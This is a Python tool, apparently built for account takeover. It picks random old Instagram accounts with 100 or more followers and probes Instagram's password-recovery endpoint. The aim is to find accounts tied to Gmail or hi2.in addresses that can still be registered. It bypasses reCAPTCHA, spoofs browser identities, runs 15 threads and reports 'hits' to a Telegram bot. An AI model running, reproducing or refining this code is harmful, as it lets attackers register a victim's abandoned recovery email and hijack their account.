import sys
import os
import time
import random
import json
import re
import requests
import threading
import uuid
import secrets
import base64
import httpx
import urllib.parse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from user_agent import generate_user_agent


class RehanHere:

    def __init__(self):
        self.RED = "\033[1;31m"
        self.GREEN = "\033[1;32m"
        self.CYAN = "\033[1;36m"
        self.WHITE = "\033[1;37m"
        self.BLUE = "\033[1;34m"
        self.YELLOW = "\033[1;33m"
        self.MAGENTA = "\033[1;35m"
        self.RESET = "\033[0m"

        self.TOKEN = ""
        self.CHAT_ID = ""

        self.hits = 0
        self.good_ig = 0
        self.bad_insta = 0
        self.skipped = 0
        self.current_email = "Waiting..."

        # Minimum 100, Maximum 2000 (2000 se upar wale bhi skip nahi honge)
        self.MIN_FOLLOWERS = 100
        self.MAX_FOLLOWERS = 2000 

        self.reporter = None
        self.google = None
        self.insta = None

    def _ui_clear(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def _ui_section(self, title):
        return f"{self.MAGENTA}----------------------------------------------------------\n{self.WHITE}{title}{self.RESET}\n{self.MAGENTA}----------------------------------------------------------{self.RESET}\n"

    def _ui_prompt(self, label):
        return f"{self.YELLOW} {label.upper()} : {self.WHITE}"

    def banner(self):
        self._ui_clear()
        pass

    def setup(self):
        print(self._ui_section(" 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 @𝗥𝗘𝗛𝗔𝗡 👑   𝗙𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀: 𝟭𝟬𝟬+ "))

        self.TOKEN = input(self._ui_prompt("Bot token")).strip()
        if not self.TOKEN: sys.exit()
        self.CHAT_ID = input(self._ui_prompt("Chat ID")).strip()
        if not self.CHAT_ID: sys.exit()

        self._ui_clear()

    def display(self):
        self._ui_clear()
        print(f"""{self.MAGENTA}==========================================================
{self.GREEN}  𝗛𝗜𝗧𝗦               : {self.WHITE}{self.hits}
{self.YELLOW}  𝗚𝗢𝗢𝗗 𝗜𝗚           :  {self.WHITE}{self.good_ig}
{self.BLUE}  𝗦𝗞𝗜𝗣𝗣𝗘𝗗           :  {self.WHITE}{self.skipped}
{self.RED}  𝗕𝗔𝗗 𝗜𝗡𝗦𝗧𝗔         :  {self.WHITE}{self.bad_insta}
{self.MAGENTA}----------------------------------------------------------
{self.WHITE}  Checking: {self.YELLOW}{self.current_email}
{self.MAGENTA}=========================================================={self.RESET}
""")
        sys.stdout.flush()

    class GoogleChecker:
        def __init__(self, outer):
            self.outer = outer
            self.yy = 'azertyuiopmlkjhgfdsqwxcvbn'
            threading.Thread(target=self._refresh_token, daemon=True).start()

        def _generate_ua(self):
            return generate_user_agent()

        def _refresh_token(self):
            while True:
                try:
                    n1 = ''.join(random.choice(self.yy) for _ in range(random.randrange(6, 9)))
                    n2 = ''.join(random.choice(self.yy) for _ in range(random.randrange(3, 9)))
                    host = ''.join(random.choice(self.yy) for _ in range(random.randrange(15, 30)))

                    headers = {"accept": "*/*", "accept-language": "en-US,en;q=0.9", "content-type": "application/x-www-form-urlencoded;charset=UTF-8", "google-accounts-xsrf": "1", "user-agent": self._generate_ua()}
                    res1 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=headers)
                    tok = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text)
                    if tok:
                        tl = tok.group(2)
                        cookies = {'__Host-GAPS': host}
                        headers2 = {'content-type': 'application/x-www-form-urlencoded;charset=UTF-8', 'google-accounts-xsrf': '1', 'origin': 'https://accounts.google.com', 'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail', 'user-agent': self._generate_ua()}
                        data = {'f.req': f'["{tl}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]', 'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'}
                        response = requests.post('https://accounts.google.com/_/signup/validatepersonaldetails', cookies=cookies, headers=headers2, data=data, timeout=15)
                        if '",null,"' in response.text: tl = response.text.split('",null,"')[1].split('"')[0]
                        host = response.cookies.get('__Host-GAPS', host)
                        with open('tl.txt', 'w') as f: f.write(tl + '//' + host + '\n')
                        time.sleep(random.uniform(10, 30))
                        continue
                except: pass
                time.sleep(random.uniform(5, 15))

        def check_availability(self, email):
            if '@' in email: email = email.split('@')[0]
            try:
                with open('tl.txt', 'r') as f:
                    line = f.read().strip()
                    if not line: raise Exception("Empty")
                    tl, host = line.split('//')
            except:
                time.sleep(3)
                with open('tl.txt', 'r') as f:
                    line = f.read().strip()
                    tl, host = line.split('//')

            cookies = {'__Host-GAPS': host}
            headers = {'content-type': 'application/x-www-form-urlencoded;charset=UTF-8', 'google-accounts-xsrf': '1', 'origin': 'https://accounts.google.com', 'referer': f'https://accounts.google.com/signup/v2/createusername?TL={tl}', 'user-agent': generate_user_agent()}
            params = {'TL': tl}
            data = f'f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D'
            try:
                response = requests.post('https://accounts.google.com/_/signup/usernameavailability', params=params, cookies=cookies, headers=headers, data=data, timeout=10)
                if '"gf.uar",1' in response.text: return 'good'
                elif '"er",null,null,null,null,400' in response.text:
                    time.sleep(1)
                    return self.check_availability(email)
                else: return 'bad'
            except: return 'bad'

    class InstagramChecker:
        def __init__(self, outer):
            self.outer = outer
            self.session = requests.Session()
            self.csrf = ''.join(random.choices('abcdef0123456789', k=32))
            self.mid = 'Z' + ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=9)) + 'AA'

        def get_username_from_id(self, uid):
            try:
                headers = {'User-Agent': "Mozilla/5.0", 'Content-Type': 'application/x-www-form-urlencoded', 'x-ig-app-id': '936619743392459'}
                data = {'lsd': ''.join(random.choices('abcdef123456', k=16)), 'variables': json.dumps({"id": str(uid), "render_surface": "PROFILE"}), 'doc_id': '7397388303713986'}
                r = requests.post("https://www.instagram.com/api/graphql", headers=headers, data=data, timeout=10)
                if r.status_code == 200:
                    user = r.json().get('data', {}).get('user')
                    if user: return user.get('username')
            except: pass
            return None

        def get_followers(self, username):
            try:
                headers = {"authority": "insta-story.com", "accept": "*/*", "content-type": "application/json", "origin": "https://insta-story.com", "referer": f"https://insta-story.com/user/{username}", "user-agent": "Mozilla/5.0"}
                data = {"username": username, "visitor_id": str(uuid.uuid4()), "user_info": True, "user_stories": False, "user_highlights": False, "user_posts": False}
                r = requests.post("https://insta-story.com/api/v1/web/profile", headers=headers, json=data, timeout=10).json()
                if r.get("user_info"): return int(r["user_info"].get("followers", 0))
            except: pass
            return 0

        def check_recovery(self, email):
            try:
                s = requests.Session()
                s.cookies.set('csrftoken', self.csrf, domain='.instagram.com')
                s.cookies.set('mid', self.mid, domain='.instagram.com')
                headers = {"User-Agent": "Instagram 320.0.0.34.109 Android", "Content-Type": "application/x-www-form-urlencoded", "X-CSRFToken": self.csrf, "X-IG-App-ID": "936619743392459"}
                data = {"email_or_username": email, "flow": "fxcal"}
                r = s.post("https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/", data=data, headers=headers, timeout=15)
                if r.status_code == 429: return 'rate'
                if r.status_code == 200:
                    msg = str(r.json()).lower()
                    if "no user found" in msg or "bulunamadı" in msg: return False
                    if "sent" in msg or '"status":"ok"' in msg: return True
                return False
            except: return False

        def check_hi2_available(self, email):
            if "@" not in email: return None
            dom = email.split("@")[1]
            pfx = email.split("@")[0]
            if dom == "telegmail.com": return False 
                
            try:
                anchor_url = "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct&co=aHR0cHM6Ly9oaTIuaW46NDQz&hl=en&v=XrIDux0s7SoNe6_IHkjGC92W&size=invisible"
                params = anchor_url.split('?')[1]
                r = requests.get(f'https://www.google.com/recaptcha/enterprise/anchor?{params}', timeout=10)
                tok = r.text.split('recaptcha-token" value="')[1].split('"')[0]
                payload = f"v={params.split('v=')[1].split('&')[0]}&reason=q&c={tok}&k=6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct&co=aHR0cHM6Ly9oaTIuaW46NDQz&hl=en&size=invisible"
                headers = {"User-Agent": "Mozilla/5.0", "Referer": f"https://www.google.com/recaptcha/enterprise/anchor?{params}", "Content-Type": "application/x-www-form-urlencoded"}
                resp = requests.post('https://www.google.com/recaptcha/enterprise/reload', data=payload, headers=headers, timeout=10)
                solve = resp.text.split('resp","')[1].split('"')[0]
            except: return None

            try:
                r = requests.post("https://hi2.in/api/custom", data={'domain': dom, 'prefix': pfx, 'recaptcha': solve}, headers={'User-Agent': "Mozilla/5.0", 'Accept': "application/json"}, timeout=15)
                res = r.json()
                if "already taken" in str(res): return True
                return False 
            except: return None

    class ReportManager:
        def __init__(self, outer, token, chat_id):
            self.outer = outer
            self.token = token
            self.chat_id = chat_id

        def send_telegram(self, msg):
            try:
                requests.post(f"https://api.telegram.org/bot{self.token}/sendMessage", json={"chat_id": self.chat_id, "text": msg, "parse_mode": "HTML"}, timeout=10)
            except: pass

        def save_to_file(self, msg, filename='rehan_hits.txt'):
            with open(filename, 'a', encoding='utf-8') as f:
                f.write(f'{msg}\n')

        def format_result(self, email, username, followers, kind):
            return f"""
<b>=== REHAN HIT FOUND ({kind}) ===</b>
<b>USERNAME</b>  -> <i>@{username}</i>
<b>EMAIL</b>     -> <i>{email}</i>
<b>FOLLOWERS</b> -> <i>{followers}</i>
<b>PROFILE</b>   -> <i>https://instagram.com/{username}</i>
=========================
<b>DEV</b>     -> <i>@REHAN</i>
=========================
"""

    def process_user(self):
        while True:
            try:
                # Purane IDs (2012-2016) se followers wale account dhoondhna
                uid = random.randint(17750001, 4239516754)
                username = self.insta.get_username_from_id(uid)
                if not username:
                    self.bad_insta += 1
                    self.display()
                    continue
                
                self.current_email = f"Checking @{username}..."
                self.display()

                # Followers Check (Minimum 100)
                followers = self.insta.get_followers(username)
                if followers < self.MIN_FOLLOWERS:
                    self.skipped += 1
                    self.display()
                    continue

                # Ab dono platforms check karo
                email_hi2 = f"{username}@hi2.in"
                email_gmail = f"{username}@gmail.com"
                
                # 1. HI2 Check
                res = self.insta.check_recovery(email_hi2)
                if res == 'rate':
                    self.bad_insta += 1
                    self.display()
                    time.sleep(2)
                    continue
                    
                if res is True:
                    self.good_ig += 1
                    self.display()
                    is_taken = self.insta.check_hi2_available(email_hi2)
                    if is_taken is False:
                        self.hits += 1
                        self.display()
                        msg = self.reporter.format_result(email_hi2, username, followers, "HI2")
                        self.reporter.save_to_file(msg)
                        self.reporter.send_telegram(msg)
                        print(f"\n{GREEN}✓ HIT: {email_hi2} | Followers: {followers}{RESET}")
                        continue # Agli ID pe jao
                
                # 2. GMAIL Check
                res = self.insta.check_recovery(email_gmail)
                if res is True:
                    self.good_ig += 1
                    self.display()
                    if self.google.check_availability(email_gmail) == 'good':
                        self.hits += 1
                        self.display()
                        msg = self.reporter.format_result(email_gmail, username, followers, "GMAIL")
                        self.reporter.save_to_file(msg)
                        self.reporter.send_telegram(msg)
                        print(f"\n{GREEN}✓ HIT: {email_gmail} | Followers: {followers}{RESET}")
                else:
                    self.bad_insta += 1
                    self.display()

                time.sleep(random.uniform(1.0, 2.0))

            except Exception:
                time.sleep(random.uniform(1.0, 2.0))

    def run(self):
        self.banner()
        self.setup()
        self.reporter = self.ReportManager(self, self.TOKEN, self.CHAT_ID)
        self.google = self.GoogleChecker(self)
        self.insta = self.InstagramChecker(self)

        self.display()

        # 15 Threads
        with ThreadPoolExecutor(max_workers=15) as executor:
            for _ in range(15):
                executor.submit(self.process_user)

        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print('\n[!] @REHAN - session ended.')


if __name__ == "__main__":
    RehanHere().run()
